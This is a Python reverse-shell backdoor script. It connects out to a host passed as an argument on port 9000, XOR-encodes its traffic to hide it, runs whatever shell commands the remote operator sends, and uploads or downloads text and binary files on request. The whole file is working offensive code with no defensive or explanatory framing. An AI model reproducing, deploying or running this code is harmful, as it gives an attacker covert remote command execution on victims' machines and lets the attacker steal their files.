#!/usr/bin/python

import sys
from subprocess import Popen, PIPE
from socket import socket, SOCK_STREAM, AF_INET
from time import sleep
from multiprocessing import Process

def make_en_STDOUT(STDOUT):
	if STDOUT:
		en_STDOUT = bytearray(STDOUT,'UTF-8')
	else:
		en_STDOUT = bytearray("Command not recognised",'UTF-8')
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	return en_STDOUT

def make_en_bin_STDOUT(STDOUT):
	if STDOUT:
		en_STDOUT = bytearray(STDOUT)
	else:
		en_STDOUT = bytearray("Command not recognised",'UTF-8')
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	return en_STDOUT

def make_en_data(data):
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i] ^=0x41
	return en_data.decode('UTF-8')

def make_en_bin_data(data):
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i] ^=0x41
	return en_data

def main():
	try:
		RHOST = sys.argv[1]
		RPORT = 9000
	except:
		print ("Must provide hotst")
		sys.exit()
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((RHOST,RPORT))

	while True:
		#recieve XOR encoded data
		data = s.recv(2048)
		
		#XOR the data again with a '/x41' to get back to normal
		en_data = make_en_data(data)
		if en_data == 'killMe':
			break
		elif en_data == 'getFile':
			print ("Started Transfer")
			data = s.recv(2048)
			en_data = make_en_data(data)
			try:
				fileToWrite = open(en_data,'w')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
			if STDOUT == 'fna':
				continue
			fSize = s.recv(1024)
			fSize = make_en_data(fSize)
			data = s.recv(int(fSize))
			en_data = make_en_data(data)
			fileToWrite.write(en_data)
			fileToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
		elif en_data == "getBinary":
			data = s.recv(1024)
			en_data = make_en_data(data)
			try:
				binToWrite = open(en_data,'wb')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
			if STDOUT == 'fna':
				continue
			bSize = s.recv(1024)
			bSize = make_en_data(bSize)
			data = s.recv(int(bSize))
			en_data = make_en_bin_data(data)
			binToWrite.write(en_data)
			binToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
		elif en_data == "sendFile":
			data = s.recv(1024)
			en_data = make_en_data(data)
			try:
				fileToSend = open(en_data,'r')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
			if STDOUT == 'fna':
				continue
			fileCont = fileToSend.read()
			STDOUT = str(len(fileCont) + 1024)
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
			sleep(0.1)
			STDOUT = fileCont
			fileToSend.close()
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
		elif en_data == "sendBinary":
			data = s.recv(1024)
			en_data = make_en_data(data)
			try:
				binToSend = open(en_data,'rb')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
			if STDOUT == 'fna':
				continue
			binCont = binToSend.read()
			binToSend.close()
			STDOUT = str(len(binCont) + 1024)
			en_STDOUT = make_en_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
			sleep(0.1)
			STDOUT = binCont
			en_STDOUT = make_en_bin_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
		else:
			comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
			STDOUT,STDERR = comm.communicate()
			en_STDOUT = make_en_STDOUT(STDOUT.decode('UTF-8'))
			try:
				s.send(en_STDOUT)
			except:
                                s.close()
				sys.exit()
	s.close()

#Start Here!
if __name__ == "__main__":
	main()
